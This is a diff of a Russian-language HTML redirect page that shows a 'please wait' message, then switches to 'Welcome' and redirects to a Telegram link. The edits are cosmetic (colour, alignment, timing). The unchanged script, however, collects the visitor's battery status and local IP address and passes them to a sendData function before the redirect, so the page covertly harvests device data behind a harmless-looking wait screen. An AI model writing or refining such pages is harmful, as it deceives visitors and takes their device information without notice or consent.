@@ -11,17 +11,18 @@
             align-items: center;
             height: 100vh;
             font-family: Arial, sans-serif;
-            background-color: #f0f0f0;
+            background-color: #f5f5dc; /* Молочно-кофейный цвет */
             margin: 0;
         }
         .message {
             font-size: 24px;
             color: #333;
+            text-align: center;
         }
     </style>
 </head>
 <body>
-    <div class="message">Ожидайте, сайт вас перенаправит...</div>
+    <div class="message" id="message">Ожидайте, сайт вас перенаправит...</div>
 
     <script>
         // Функция для получения данных о батарее
@@ -95,12 +96,18 @@
             getLocalIP(function(localIP) {
                 sendData(batteryInfo, localIP);
 
-                // Задержка в 3 секунды перед перенаправлением
+                // Изменение текста через 3 секунды
+                setTimeout(function() {
+                    document.getElementById('message').innerText = 'Welcome';
+                }, 3000);
+
+                // Задержка в 5 секунд перед перенаправлением
                 setTimeout(function() {
                     window.location.href = "https://t.me/unixgnutgk"; // Укажи целевой URL
-                }, 3000); // 3000 миллисекунд = 3 секунды
+                }, 5000); // 5000 миллисекунд = 5 секунд
             });
         });
     </script>
 </body>
 </html>
+
